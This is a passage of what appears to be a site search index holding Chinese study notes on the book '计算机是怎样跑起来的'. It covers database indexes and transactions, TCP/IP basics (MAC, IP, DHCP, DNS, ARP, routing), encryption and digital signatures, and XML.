\u76f8\u6bd4\uff0c\u7d22\u5f15\u8868\u4e2d\u7684\u5b57\u6bb5\u6570\u66f4\u5c11\uff0c\u6240\u4ee5\u53ef\u4ee5\u66f4\u5feb\u5730\u8fdb\u884c\u6570\u636e\u7684\u68c0\u7d22\u548c\u6392 \u5e8f\u3002\u5f53\u67e5\u8be2\u6570\u636e\u65f6\uff0cDBMS \u5148\u5728\u7d22\u5f15\u8868\u4e2d\u8fdb\u884c\u6570\u636e\u7684\u68c0\u7d22\u548c\u6392\u5e8f\uff0c\u7136 \u540e\u518d\u6839\u636e\u4f4d\u7f6e\u4fe1\u606f\u4ece\u539f\u6765\u7684\u6570\u636e\u8868\u4e2d\u628a\u5b8c\u6574\u7684\u8bb0\u5f55\u53d6\u51fa\u6765\u3002\u7d22\u5f15\u6240\u8d77 \u7684\u5c31\u662f\u201c\u76ee\u5f55\u201d\u7684\u4f5c\u7528\u3002\u4e0e\u56fe\u4e66\u7684\u76ee\u5f55\u4e00\u6837\uff0c\u6570\u636e\u5e93\u7684\u7d22\u5f15\u4e5f\u662f\u4e00\u79cd\u80fd \u591f\u9ad8\u6548\u5730\u67e5\u627e\u76ee\u6807\u6570\u636e\u7684\u673a\u5236</p> <p>\u56e0\u4e3a\u4e00\u65e6\u8bbe\u7f6e\u4e86\u7d22\u5f15\uff0c\u6bcf\u6b21\u5411\u8868\u4e2d\u63d2\u5165\u6570\u636e\u65f6\uff0cDBMS \u90fd\u5fc5\u987b\u66f4\u65b0\u7d22 \u5f15\u8868\u3002\u63d0\u5347\u6570\u636e\u68c0\u7d22\u548c\u6392\u5e8f\u901f\u5ea6\u7684\u4ee3\u4ef7\uff0c\u5c31\u662f\u63d2\u5165\u6216\u66f4\u65b0\u6570\u636e\u901f\u5ea6\u7684 \u964d\u4f4e\u3002\u56e0\u6b64\uff0c\u53ea\u6709\u5bf9\u90a3\u4e9b\u8981\u9891\u7e41\u5730\u8fdb\u884c\u68c0\u7d22\u548c\u6392\u5e8f\u7684\u5b57\u6bb5\uff0c\u624d\u9700\u8981\u8bbe \u7f6e\u7d22\u5f15\u3002</p> <p>\u5982\u679c\u8868\u4e2d\u5145\u5176\u91cf\u4e5f\u5c31 \u53ea\u6709\u51e0\u5343\u6761\u8bb0\u5f55\uff0c\u90a3\u4e48\u5373\u4f7f\u5b8c\u5168\u4e0d\u4f7f\u7528\u7d22\u5f15\uff0c\u4e5f\u4e0d\u4f1a\u611f\u5230\u68c0\u7d22\u6216\u6392\u5e8f \u901f\u5ea6\u6709\u591a\u6162\u3002</p> <p>\u25cf 8.7 \u8bbe\u8ba1\u7528\u6237\u754c\u9762 164 </p> <p>\u5728\u8bbe\u8ba1\u7cfb\u7edf\u65f6\uff0c\u8bf7\u8bf8\u4f4d\u8bb0\u4f4f\u4e00\u4e2a\u91cd\u8981\u7684\u987a\u5e8f\uff1a\u4f18\u5148\u8bbe\u8ba1\u6570\u636e\u5e93\uff0c\u7136\u540e\u518d\u8bbe\u8ba1\u7528\u6237\u754c\u9762\u3002</p> <p>\u7531\u4e8e DBMS \u5177\u6709\u81ea\u52a8\u751f\u6210\u4e3b\u952e\u548c\u5916\u952e\u4e0a\u7684\u503c\u7684\u529f\u80fd\uff0c\u6240\u4ee5\u5728\u8bbe\u8ba1 \u7528\u6237\u754c\u9762\u65f6\uff0c\u9700\u8981\u663e\u793a\u5176\u4f59\u7684\u5b57\u6bb5\uff0c\u5e76\u8981\u4f7f CRUD \u64cd\u4f5c\u80fd\u591f\u901a\u8fc7\u6309\u94ae \u548c\u83dc\u5355\u6765\u5b8c\u6210\u3002</p> <p>\u25cf 8.8 \u5411DBMS\u53d1\u9001CRUD\u64cd\u4f5c\u7684SQL\u8bed\u53e5 165 </p> <p>\u25cf 8.9 \u4f7f\u7528\u6570\u636e\u5bf9\u8c61\u5411DBMS\u53d1\u9001SQL\u8bed\u53e5 167 </p> <p>\u25cf 8.10 \u4e8b\u52a1\u63a7\u5236\u4e5f\u53ef\u4ee5\u4ea4\u7ed9DBMS\u5904\u7406 170</p> <p>\u4e8b\u52a1\u63a7\u5236\u3002\u4e8b\u52a1\u7531\u82e5\u5e72\u6761SQL \u8bed\u53e5\u6784\u6210\uff0c\u8868\u793a\u5bf9\u6570\u636e\u5e93\u4e00\u7cfb\u5217\u76f8\u5173\u64cd\u4f5c\u7684\u96c6\u5408\u3002</p> <pre><code>\u4e3a\u4e86\u4ece\u987e\u5ba2 A \u7684\u8d26\u6237\u4e2d\n\u7ed9\u987e\u5ba2 B \u7684\u8d26\u6237\u6c47\u5165 1 \u4e07\u65e5\u5143\uff0c\u5c31\u9700\u8981\u5c06\u4ee5\u4e0b\u4e24\u6761 SQL \u8bed\u53e5\u4f9d\u6b21\u53d1\u9001\n\u7ed9 DBMS \uff1a1. \u628a A \u7684\u8d26\u6237\u4f59\u989d\u66f4\u65b0\uff08UPDATE \u8bed\u53e5\uff09\u4e3a\u73b0\u6709\u4f59\u989d\u51cf\u53bb\n1 \u4e07\u65e5\u5143\uff1b2. \u628a B \u7684\u8d26\u6237\u4f59\u989d\u66f4\u65b0\uff08UPDATE \u8bed\u53e5\uff09\u4e3a\u73b0\u6709\u4f59\u989d\u52a0\u4e0a\n1 \u4e07\u65e5\u5143\u3002\u6b64\u65f6\u8fd9\u4e24\u6761 SQL \u8bed\u53e5\u5c31\u6784\u6210\u4e86\u4e00\u4e2a\u4e8b\u52a1\u3002\n</code></pre> <p>\u4e3a\u4e86\u9632\u6b62\u51fa\u73b0\u8fd9\u79cd\u95ee\u9898\uff0c\u5728 SQL \u8bed\u8a00\u4e2d\u8bbe\u8ba1\u4e86\u4ee5\u4e0b\u4e09\u6761 \u8bed\u53e5\uff1a1. BEGIN TRANSACTION\uff08\u5f00\u542f\u4e8b\u52a1\uff09\u8bed\u53e5\uff0c\u7528\u4e8e\u901a\u77e5 DBMS\u5f00\u542f\u4e8b\u52a1\uff1b2. COMMIT\uff08\u63d0\u4ea4\u4e8b\u52a1\uff09\u8bed\u53e5\uff0c\u7528\u4e8e\u901a\u77e5 DBMS \u63d0\u4ea4\u4e8b\u52a1\uff1b3. ROLL BACK\uff08\u4e8b\u52a1\u56de\u6eda\uff09\u8bed\u53e5\uff0c\u7528\u4e8e\u5728\u4e8b\u52a1\u8fdb\u884c\u4e2d\u53d1\u751f\u95ee\u9898\u65f6\uff0c\u628a\u6570\u636e\u5e93\u4e2d\u7684\u6570\u636e\u6062\u590d\u5230\u4e8b\u52a1\u5f00\u59cb\u524d\u7684\u72b6\u6001\uff08\u5982\u56fe 8.16 \u6240\u793a\uff09\u3002</p>"},{"location":"other/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%98%AF%E6%80%8E%E6%A0%B7%E8%B7%91%E8%B5%B7%E6%9D%A5%E7%9A%84/#9-tcpip-175","title":"\u7b2c9\u7ae0 \u901a\u8fc7\u4e03\u4e2a\u7b80\u5355\u7684\u5b9e\u9a8c\u7406\u89e3 TCP/IP \u7f51\u7edc 175\uff08\u8ba1\u7b97\u673a\u7f51\u7edc\uff09","text":"<p>LAN \u662f Local Area Network\uff08\u5c40\u57df\u7f51\uff09\u7684\u7f29\u7565\u8bed\u3002\u901a\u5e38\u628a\u5728\u4e00\u680b\u5efa\u7b51\u7269\u5185\u6216\u662f\u4e00\u95f4\u529e\u516c\u5ba4\u91cc\u7684\u90a3\u79cd\u5c0f\u89c4 \u6a21\u7f51\u7edc\u79f0\u4f5c LAN\u3002\u4e0e\u6b64\u76f8\u5bf9\uff0c\u628a\u4e92\u8054\u7f51\u90a3\u6837\u7684\u5927\u89c4\u6a21\u7f51\u7edc\u79f0\u4f5c WAN\uff08Wide Area Network\uff0c\u5e7f\u57df\u7f51\uff09\u3002</p> <p>\u8def\u7531\u5668\u8d1f\u8d23\u5c06 LAN \u8fde\u63a5\u5230 WAN \u4e0a\u3002</p> <p>MAC \u5730\u5740\u5c31\u662f\u80fd\u591f\u6807\u8bc6\u7f51\u5361\u7684\u7f16\u53f7\u3002\u51e0\u4e4e\u6240\u6709\u7684\u7f51\u5361\u90fd\u4f1a\u5728\u4e0a\u5e02\u524d\u88ab\u5206\u914d\u4e00\u4e2a\u4e0d\u53ef\u53d8\u66f4\u7684MAC \u5730\u5740\u3002</p> <p>\u25cf 9.1 \u5b9e\u9a8c\u73af\u5883 177</p> <p>\u25cf 9.2 \u5b9e\u9a8c 1 :\u67e5\u770b\u7f51\u5361\u7684 MAC \u5730\u5740 179 </p> <p>\u8fd9 \u5957 \u673a \u5236 \u53eb \u4f5c CSMA/CD\uff08Career Sense Multiple Access with Collision Detection\uff0c\u5e26\u51b2\u7a81\u68c0\u6d4b\u7684\u8f7d\u6ce2\u76d1\u542c\u591a\u8def\u8bbf\u95ee\uff09\u3002\u6240\u8c13\u8f7d\u6ce2\u76d1\u542c \uff08Career Sense\uff09\uff0c\u6307\u7684\u662f\u8fd9\u5957\u673a\u5236\u4f1a\u53bb\u76d1\u542c\uff08Sense\uff09\u8868\u793a\u7f51\u7edc\u662f\u5426\u6b63\u5728 \u4f7f\u7528\u7684\u7535\u4fe1\u53f7\uff08Career\uff09\u3002 \u800c \u591a \u8def \u590d \u7528\uff08Multiple Access\uff09\u6307\u7684\u662f\u591a\u4e2a \uff08Multiple\uff09\u8bbe\u5907\u53ef\u4ee5\u540c\u65f6\u8bbf\u95ee\uff08Access\uff09\u4f20\u8f93\u4ecb\u8d28\u3002\u5e26\u51b2\u7a81\u68c0\u6d4b\uff08with Collision Detection\uff09\u5219\u8868\u793a\u8fd9\u5957\u673a\u5236\u4f1a\u53bb\u68c0\u6d4b\uff08Detection\uff09\u56e0\u540c\u4e00\u65f6\u523b</p> <p>\u7684\u4f20\u8f93\u800c\u5bfc\u81f4\u7684\u7535\u4fe1\u53f7\u51b2\u7a81\uff08Collision\uff09\u3002\u5728\u5c0f\u89c4\u6a21\u7684 LAN \u4e2d\uff0c\u50cf\u8fd9\u6837 \u7565\u663e\u7c97\u8e81\u7684 CSMA/CD \u673a\u5236\u662f\u53ef\u4ee5\u6b63\u5e38\u8fd0\u8f6c\u7684\u3002\u56e0\u4e3a CSMA/CD \u5f52\u6839 \u7ed3\u5e95\u4e5f\u53ea\u662f\u4e00\u79cd\u9002\u7528\u4e8e LAN \u7684\u673a\u5236\u3002</p> <p>\u4e00\u53f0\u8ba1\u7b97\u673a\u6536\u5230\u4e86\u7535\u4fe1\u53f7\u4ee5\u540e\u4f1a\u5148\u505a\u5224\u65ad\uff0c\u5982\u679c\u662f\u53d1\u9001\u7ed9 \u81ea\u5df1\u7684\u5219\u9009\u62e9\u63a5\u6536\uff0c\u53cd\u4e4b\u5219\u9009\u62e9\u5ffd\u7565\u3002\u53ef\u4ee5\u7528\u88ab\u79f0\u4f5c MAC\uff08Media Access Control\uff09\u5730\u5740\u7684\u7f16\u53f7\u6765\u6307\u5b9a\u7535\u4fe1\u53f7\u7684\u63a5\u6536\u8005\u3002\u5728\u6bcf\u4e00\u5757\u7f51\u5361\u6240 \u5e26\u6709\u7684 ROM\uff08Read Only Memory\uff0c\u53ea\u8bfb\u5b58\u50a8\u5668\uff09\u4e2d\uff0c\u90fd\u9884\u5148\u70e7\u5f55\u4e86\u4e00 \u4e2a\u552f\u4e00\u7684 MAC \u5730\u5740\u3002</p> <pre><code>ipconfig\n\nifconfig\n</code></pre> <p>\u4e0d\u540c\u64cd\u4f5c\u7cfb\u7edf\u4e0b\u9762\uff0c\u67e5\u770b MAC \u5730\u5740\u7684\u547d\u4ee4\u4e0d\u4e00\u81f4</p> <p>\u25cf 9.3 \u5b9e\u9a8c 2 :\u67e5\u770b\u8ba1\u7b97\u673a\u7684 IP \u5730\u5740 182 </p> <p>\u5728 TCP/IP \u7f51\u7edc\u4e2d\uff0c\u9664\u4e86\u786c\u4ef6\u4e0a\u7684 MAC \u5730\u5740\uff0c\u8fd8\u9700\u8981\u4e3a\u6bcf\u53f0\u8ba1\u7b97\u673a\u8bbe\u5b9a\u4e00\u4e2a\u8f6f\u4ef6\u4e0a\u7684\u7f16\u53f7\u3002\u8fd9\u4e2a\u7f16\u53f7\u5c31\u662f\u4f17\u6240\u5468\u77e5\u7684 IP \u5730\u5740\u3002</p> <p>\u901a\u5e38\u628a\u8bbe\u5b9a\u4e86 IP \u5730\u5740\u7684\u8ba1\u7b97\u673a\u79f0\u4e3a\u201c\u4e3b\u673a\u201d\uff08Host\uff09\u3002\u56e0\u4e3a\u8def\u7531\u5668 \u4e5f\u7b97\u662f\u8ba1\u7b97\u673a\u7684\u4e00\u79cd\uff0c\u6240\u4ee5\u5b83\u4eec\u4e5f\u6709 IP \u5730\u5740\u3002\u5728 TCP/IP \u7f51\u7edc\u4e2d\uff0c\u4f20\u8f93 \u7684\u6570\u636e\u90fd\u4f1a\u643a\u5e26 MAC \u5730\u5740\u548c IP \u5730\u5740\u4e24\u4e2a\u5730\u5740\u3002</p> <p>\u25cf 9.4 \u5b9e\u9a8c 3 :\u4e86\u89e3 DHCP \u670d\u52a1\u5668\u7684\u4f5c\u7528 184 </p> <p>\u867d\u7136\u5728\u8fd9\u4e2a\u5bf9\u8bdd\u6846\u4e2d\u53ef\u4ee5\u624b\u52a8\u8bbe\u7f6e IP \u5730\u5740\u548c\u5b50\u7f51\u63a9\u7801\uff0c\u4f46\u662f\u5927\u591a \u6570\u60c5\u51b5\u4e0b\u9009\u62e9\u7684\u8fd8\u662f\u201c\u81ea\u52a8\u83b7\u5f97 IP \u5730\u5740\u201d\u8fd9\u4e2a\u9009\u9879\u3002\u8fd9\u4e2a\u9009\u9879\u4f7f\u5f97\u8ba1 \u7b97\u673a\u5728\u542f\u52a8\u65f6\u4f1a\u53bb\u4ece DHCP \u670d\u52a1\u5668\u83b7\u53d6 IP \u5730\u5740\u548c\u5b50\u7f51\u63a9\u7801\uff0c\u5e76\u81ea\u52a8\u5730 \u914d\u7f6e\u5b83\u4eec\u3002</p> <p>DHCP \u7684\u5168\u79f0\u662f Dynamic Host Configuration Protocol\uff08\u52a8\u6001\u4e3b\u673a\u8bbe \u7f6e\u534f\u8bae\uff09\u3002</p> <p>\u25cf 9.5 \u5b9e\u9a8c 4 :\u8def\u7531\u5668\u662f\u6570\u636e\u4f20\u8f93\u8fc7\u7a0b\u4e2d\u7684\u6307\u8def\u4eba 186 </p> <p>\u5728\u4e00\u53f0\u8def\u7531\u5668\u7684\u8def\u7531\u8868\u4e2d\uff0c\u53ea\u4f1a\u8bb0\u5f55\u901a\u5f80\u4e0e\u4e4b\u76f8\u90bb\u7684\u8def\u7531\u5668\u7684\u8def\u5f84\uff0c\u800c\u5e76\u4e0d\u4f1a\u8bb0\u5f55\u4e16\u754c\u8303\u56f4\u5185\u7684\u6240\u6709\u4f20\u8f93\u8def\u5f84\u3002</p> <p>\u5982\u679c\u6570\u636e\u7684\u53d1\u9001\u76ee\u7684\u5730\u5c31\u5728\u672c LAN \u4e2d\uff0c\u5219\u53ef\u4ee5\u76f4 \u63a5\u53d1\u9001\u6570\u636e\u800c\u65e0\u9700\u7ecf\u8fc7\u8def\u7531\u5668\u8f6c\u53d1\uff1b\u53cd\u4e4b\u5982\u679c\u5728 LAN \u5916\uff08\u6216\u53d1\u9001\u76ee\u7684 \u5730\u7684 IP \u5730\u5740\u4e0d\u5728\u8def\u7531\u8868\u4e2d\uff09\uff0c\u5219\u9700\u8981\u7ecf\u8fc7\u8def\u7531\u5668\u8f6c\u53d1\u3002</p> <p>\u25cf 9.6 \u5b9e\u9a8c 5 :\u67e5\u770b\u8def\u7531\u5668\u7684\u8def\u7531\u8fc7\u7a0b 188 </p> <p>\u25cf 9.7 \u5b9e\u9a8c6 :DNS\u670d\u52a1\u5668\u53ef\u4ee5\u628a\u4e3b\u673a\u540d\u89e3\u6790\u6210IP\u5730\u5740 190 </p> <p>DNS \u670d\u52a1\u5668\u901a \u5e38\u88ab\u90e8\u7f72\u5728\u5404\u4e2a LAN \u4e2d\uff0c\u91cc\u9762\u8bb0\u5f55\u7740 FQDN \u548c IP \u5730\u5740\u7684\u5bf9\u5e94\u5173\u7cfb\u8868\u3002</p> <p>\u5982\u679c\u4e00\u53f0 DNS \u670d\u52a1\u5668\u65e0\u6cd5\u89e3\u6790\u57df\u540d\uff0c\u5b83\u5c31\u4f1a\u53bb\u8be2\u95ee\u5176\u4ed6\u7684 DNS \u670d\u52a1\u5668\u3002</p> <p>\u25cf 9.8 \u5b9e\u9a8c 7 :\u67e5\u770b IP \u5730\u5740\u548c MAC \u5730\u5740\u7684\u5bf9\u5e94\u5173\u7cfb 192 </p> <p>\u7528\u4e8e\u5b9e\u73b0\u7531 IP \u5730\u5740\u5230 MAC \u5730\u5740\u7684\u8f6c\u6362\uff0c\u8fd9 \u79cd\u529f\u80fd\u88ab\u79f0\u4f5c ARP\uff08Address Resolution Protocol\uff0c\u5730\u5740\u89e3\u6790\u534f\u8bae\uff09\u3002</p> <p>\u5f53\u5411\u5404\u4e2a\u8ba1\u7b97\u673a\u90fd\u8be2\u95ee \u5b8c\u4e00\u8f6e\u4e4b\u540e\uff0c\u5c31\u4f1a\u628a\u5f97\u5230\u7684 MAC \u5730\u5740\u548c IP \u5730\u5740\u7684\u5bf9\u5e94\u5173\u7cfb\u7f13\u5b58\u8d77\u6765 \uff08\u4e34\u65f6\u4fdd\u5b58\u5728\u5185\u5b58\u4e2d\uff09\u3002\u5b58\u8d77\u6765\u7684\u8fd9\u4e9b\u5bf9\u5e94\u5173\u7cfb\u4fe1\u606f\u79f0\u4f5c\u201cARP \u7f13\u5b58 \u8868\u201d\u3002</p> <p>\u25cf 9.9 TCP\u7684\u4f5c\u7528\u53caTCP/IP\u7f51\u7edc\u7684\u5c42\u7ea7\u6a21\u578b 193</p> <p>IP \u534f\u8bae \u7528\u4e8e\u6307\u5b9a\u6570\u636e\u53d1\u9001\u76ee\u7684\u5730\u7684 IP \u5730\u5740\u4ee5\u53ca\u901a\u8fc7\u8def\u7531\u5668\u8f6c\u53d1\u6570\u636e\u3002\u800c TCP \u534f\u8bae\u5219\u7528\u4e8e\u901a\u8fc7\u6570\u636e\u53d1\u9001\u8005\u548c\u63a5\u6536\u8005\u76f8\u4e92\u56de\u5e94\u5bf9\u65b9\u53d1\u6765\u7684\u786e\u8ba4\u4fe1 \u53f7\uff0c \u53ef \u9760 \u5730 \u4f20 \u8f93 \u6570 \u636e\u3002</p>"},{"location":"other/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%98%AF%E6%80%8E%E6%A0%B7%E8%B7%91%E8%B5%B7%E6%9D%A5%E7%9A%84/#10-197","title":"\u7b2c10\u7ae0 \u8bd5\u7740\u52a0\u5bc6\u6570\u636e\u5427 197","text":"<p>\u4fe1\u606f\u6458\u8981\u662f\u6307\u4ece\u4f5c\u4e3a\u6570\u5b57\u7b7e\u540d\u5bf9\u8c61\u7684\u6587\u4ef6\u6574\u4f53\u4e2d\u8ba1\u7b97\u51fa\u7684\u6570\u503c\u3002\u5bf9\u6bd4\u7531\u6587\u4ef6\u6574\u4f53\u8ba1\u7b97\u51fa\u7684\u4fe1\u606f\u6458\u8981\uff0c\u53ef\u4ee5\u8bc1\u660e\u6587\u4ef6\u7684\u5185\u5bb9\u6709\u6ca1\u6709\u88ab\u7be1\u6539\u3002\u52a0\u5bc6\u5904\u7406\u8fc7\u7684\u4fe1\u606f\u6458\u8981\u5c31\u662f\u6570\u5b57\u7b7e\u540d\u3002</p> <p>\u25cf 10.1 \u5148\u6765\u660e\u786e\u4e00\u4e0b\u4ec0\u4e48\u662f\u52a0\u5bc6 199 </p> <p>\u5bf9\u79f0\u5bc6\u94a5\u52a0\u5bc6\u6280\u672f\u3002\u8fd9\u79cd\u52a0\u5bc6\u6280\u672f\u7684\u7279\u5f81\u662f\u5728\u52a0\u5bc6 \u548c\u89e3\u5bc6\u7684\u8fc7\u7a0b\u4e2d\u4f7f\u7528\u6570\u503c\u76f8\u540c\u7684\u5bc6\u94a5\u3002\u56e0\u6b64\uff0c\u8981\u4f7f\u7528\u8fd9\u79cd\u6280\u672f\uff0c\u5c31\u5fc5 \u987b\u4e8b\u5148\u628a\u5bc6\u94a5\u7684\u503c\u4f5c\u4e3a\u53ea\u6709\u53d1\u9001\u8005\u548c\u63a5\u6536\u8005\u624d\u77e5\u9053\u7684\u79d8\u5bc6\u4fdd\u62a4\u597d\u3002\u4e92\u8054\u7f51\u7684\u5b58\u5728\u5e94 \u8be5\u610f\u5473\u7740\u7528\u6237\u53ef\u4ee5\u5b9e\u65f6\u5730\u4e0e\u4e16\u754c\u5404\u5730\u7684\u4eba\u4eec\u4ea4\u6362\u4fe1\u606f\u3002\u56e0\u6b64\u5bf9\u79f0\u5bc6\u94a5</p> <p>\u52a0\u5bc6\u6280\u672f\u4e0d\u9002\u5408\u5728\u4e92\u8054\u7f51\u4e2d\u4f7f\u7528\u3002</p> <p>\u25cf 10.2 \u9519\u5f00\u5b57\u7b26\u7f16\u7801\u7684\u52a0\u5bc6\u65b9\u5f0f 201 </p> <p>\u25cf 10.3 \u5bc6\u94a5\u8d8a\u957f\uff0c\u89e3\u5bc6\u8d8a\u56f0\u96be 205 </p> <p>\u25cf 10.4 \u9002\u7528\u4e8e\u4e92\u8054\u7f51\u7684\u516c\u5f00\u5bc6\u94a5\u52a0\u5bc6\u6280\u672f 208 </p> <p>\u5b9e\u73b0\u516c\u5f00\u5bc6\u94a5\u52a0\u5bc6\u6280\u672f\u7684\u7b97\u6cd5\u6709\u82e5\u5e72\u79cd\uff0c\u8fd9\u91cc\u7b14\u8005\u5c06\u4ecb\u7ecd \u76ee\u524d\u5e7f\u6cdb\u5e94\u7528\u4e8e\u4e92\u8054\u7f51\u4e2d\u7684 RSA \u7b97\u6cd5</p> <p>\u25cf 10.5 \u6570\u5b57\u7b7e\u540d\u53ef\u4ee5\u8bc1\u660e\u6570\u636e\u7684\u53d1\u9001\u8005\u662f\u8c01 211</p> <p>\u800c\u5728\u901a\u8fc7\u7f51\u7edc\u4f20\u8f93\u7684\u6587\u4ef6\u4e2d\uff0c\u6570\u5b57\u7b7e\u540d\u53ef\u4ee5\u53d1\u6325\u51fa\u4e0e\u5370\u7ae0\u548c\u7b7e \u540d\u540c\u6837\u7684\u8bc1\u660e\u6548\u679c\u3002\u901a\u5e38\u53ef\u4ee5\u6309\u7167\u4e0b\u9762\u7684\u6b65\u9aa4\u751f\u6210\u6570\u636e\u7b7e\u540d\u3002\u6b65\u9aa4\u4e2d \u6240\u63d0\u53ca\u7684\u201c\u4fe1\u606f\u6458\u8981\u201d(Message Digest)\u53ef\u4ee5\u7406\u89e3\u4e3a\u5c31\u662f\u4e00\u4e2a\u6570\u503c\uff0c\u901a \u8fc7\u5bf9\u6784\u6210\u660e\u6587\u7684\u6240\u6709\u5b57\u7b26\u7684\u7f16\u7801\u8fdb\u884c\u67d0\u79cd\u8fd0\u7b97\u5c31\u80fd\u5f97\u51fa\u8be5\u6570\u503c\u3002</p> <p>\u8fd9\u91cc\u662f\u4f7f\u7528\u79c1\u94a5\u8fdb\u884c\u52a0\u5bc6\u3001\u4f7f\u7528\u516c\u94a5\u8fdb\u884c\u89e3\u5bc6</p> <p>\u53d1\u9001\u8005\u7528\u6784\u6210\u6587\u4ef6\u7684\u6240\u6709\u5b57\u7b26\u7684\u7f16\u7801\u751f\u6210\u4e86\u4fe1\u606f\u6458\u8981\uff0c\u5c31\u8bc1 \u660e\u53d1\u9001\u8005\u4ece\u5934\u5230\u5c3e\u68c0\u67e5\u4e86\u6587\u4ef6\u5e76\u627f\u8ba4\u5176\u5185\u5bb9\u5b8c\u6574\u6709\u6548\u3002\u5982\u679c\u63a5\u6536\u8005\u91cd \u65b0\u7b97\u51fa\u7684\u4fe1\u606f\u6458\u8981\u548c\u7ecf\u8fc7\u53d1\u9001\u8005\u52a0\u5bc6\u7684\u4fe1\u606f\u6458\u8981\u5339\u914d\uff0c\u5c31\u8bc1\u660e\u6587\u4ef6\u5728 \u4f20\u8f93\u8fc7\u7a0b\u4e2d\u6ca1\u6709\u88ab\u7be1\u6539\uff0c\u5e76\u4e14\u7684\u786e\u662f\u53d1\u9001\u8005\u672c\u4eba\u53d1\u9001\u7684\u3002\u6b63\u56e0\u4e3a\u6570\u636e \u662f\u7528\u53d1\u9001\u8005\u7684\u79c1\u94a5\u52a0\u5bc6\u7684\uff0c\u63a5\u6536\u8005\u624d\u80fd\u7528\u53d1\u9001\u8005\u7684\u516c\u94a5\u8fdb\u884c\u89e3\u5bc6\u3002</p> <p>\u5408\u7406\u7684\u5bc6\u94a5\u5e94\u8be5\u6ee1\u8db3\u5982\u4e0b\u6761\u4ef6:\u957f\u77ed\u9002\u4e2d\u3001\u53ef\u4ee5\u53cd\u590d\u4f7f\u7528\u3001\u53ef\u4ee5 \u901a\u8fc7\u67d0\u79cd\u901a\u4fe1\u624b\u6bb5\u4ea4\u7ed9\u63a5\u6536\u8005\uff0c\u5e76\u4e14\u901a\u4fe1\u53cc\u65b9\u4ee5\u5916\u7684\u5176\u4ed6\u4eba\u96be\u4ee5\u7528\u5b83 \u6765\u89e3\u5bc6\u3002\u516c\u5f00\u5bc6\u94a5\u52a0\u5bc6\u6280\u672f\u5c31\u5b8c\u5168\u6ee1\u8db3\u4e0a\u8ff0\u6761\u4ef6\uff0c</p>"},{"location":"other/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%98%AF%E6%80%8E%E6%A0%B7%E8%B7%91%E8%B5%B7%E6%9D%A5%E7%9A%84/#11-xml-215","title":"\u7b2c11 \u7ae0 XML \u7a76\u7adf\u662f\u4ec0\u4e48 215","text":"<p>ML\u662fExtensible Markup Language(\u53ef\u6269\u5c55\u6807\u8bb0 \u8bed\u8a00)\u7684\u7f29\u5199\u3002</p> <p>HTML\u662f\u7528\u4e8e\u7f16\u5199\u7f51\u9875\u7684\u6807\u8bb0\u8bed\u8a00\u3002XML\u662f\u7528\u4e8e\u5b9a \u4e49\u4efb\u610f\u6807\u8bb0\u8bed\u8a00\u7684\u5143\u8bed\u8a00\u3002\u901a\u5e38\u628a\u7528\u4e8e\u5b9a\u4e49\u65b0\u8bed\u8a00\u7684\u8bed\u8a00\u79f0\u4f5c\u5143\u8bed\u8a00\u3002\u901a\u8fc7\u4f7f\u7528 XML \u53ef\u4ee5\u5b9a\u4e49\u51fa\u5404\u79cd\u5404\u6837\u7684\u65b0\u8bed\u8a00\u3002</p> <p>\u25cf 11.1 XML\u662f\u6807\u8bb0\u8bed\u8a00 217 </p> <p>XML \u672c\u8eab\u5e76\u4e0d \u4f1a\u9650\u5b9a\u6807\u7b7e\u7684\u79cd\u7c7b\uff0c\u53cd\u5012\u662f\u5141\u8bb8 XML \u7684\u4f7f\u7528\u8005\u968f\u5fc3\u6240\u6b32\u5730\u521b\u5efa\u6807\u7b7e\u3002\u5728\u201c&lt;\u201d\u548c\u201c&gt;\u201d\u4e2d\u7684\u5355\u8bcd\u53ef\u4ee5\u662f\u4efb\u610f\u7684\u3002\u8fd9\u5c31\u662f\u6240\u8c13\u7684\u201c\u53ef \u6269\u5c55\u201d\u3002\u8bf4 XML \u4ec5\u4ec5\u9650\u5b9a\u4e86\u8fdb\u884c\u6807\u8bb0\u65f6\u6807\u7b7e\u7684\u4e66\u5199\u683c\u5f0f(\u4e66\u5199\u98ce\u683c)\u3002\u4e5f\u5c31 \u662f\u8bf4\u901a\u8fc7\u5b9a\u4e49\u8981\u4f7f\u7528\u7684\u6807\u7b7e\u79cd\u7c7b\uff0c\u5c31\u53ef\u4ee5\u521b\u9020\u51fa\u4e00\u95e8\u65b0\u7684\u6807\u8bb0\u8bed\u8a00\u3002</p> <p>\u5728 HTML \u4e2d\uff0c\u6211\u4eec\u53ea\u80fd\u4f7f\u7528\u7531 HTML \u5b9a\u4e49\u51fa\u7684\u90a3\u82e5\u5e72\u79cd\u6807\u7b7e\uff0c \u56e0\u6b64 HTML \u662f\u56fa\u5b9a\u7684\u6807\u8bb0\u8bed\u8a00\u3002</p> <p>HTML \u662f\u7ed9\u4eba\u770b\u7684\uff0cXML \u662f\u7ed9\u8ba1\u7b97\u673a\u770b\u7684</p> <p>\u25cf 11.2 XML\u662f\u53ef\u6269\u5c55\u7684\u8bed\u8a00 219 </p> <p>\u25cf 11.3 XML\u662f\u5143\u8bed\u8a00 220 </p> <p>\u25cf 11.4 XML\u53ef\u4ee5\u4e3a\u4fe1\u606f\u8d4b\u4e88\u610f\u4e49 224 </p> <p>\u25cf 11.5 XML\u662f\u901a\u7528\u7684\u6570\u636e\u4ea4\u6362\u683c\u5f0f 227 </p> <p>\u5728\u8ba1\u7b97\u673a\u884c\u4e1a\uff0c\u957f\u4e45\u4ee5\u6765\u4e00\u76f4\u628a CSV(Comma Separated Value\uff0c \u9017\u53f7\u5206\u9694\u503c)\u4f5c\u4e3a\u901a\u7528\u6570\u636e\u4ea4\u6362\u683c\u5f0f\u6cbf\u7528\u81f3\u4eca\u3002</p> <p>CSV \u6587\u4ef6\u7684\u6269\u5c55\u540d\u4e3a .csv\u3002\u6b63\u5982\u5176\u540d\uff0c\u5728 CSV \u6587\u4ef6\u4e2d\uff0c\u8bb0\u5f55\u7684\u662f \u7ecf\u8fc7\u201c,\u201d(\u534a\u89d2\u9017\u53f7)\u5206\u5272\u540e\u7684\u4fe1\u606f\u3002</p> <p>CSV \u6587\u4ef6\u7684\u5927\u5c0f\u4e0d\u8fc7 50 \u5b57\u8282\uff0c\u800c\u8fd9\u4e2a XML \u6587\u4ef6\u7684\u5927\u5c0f\u662f 280 \u5b57\u8282\uff0c \u7adf\u6bd4 CSV \u6587\u4ef6\u7684 5 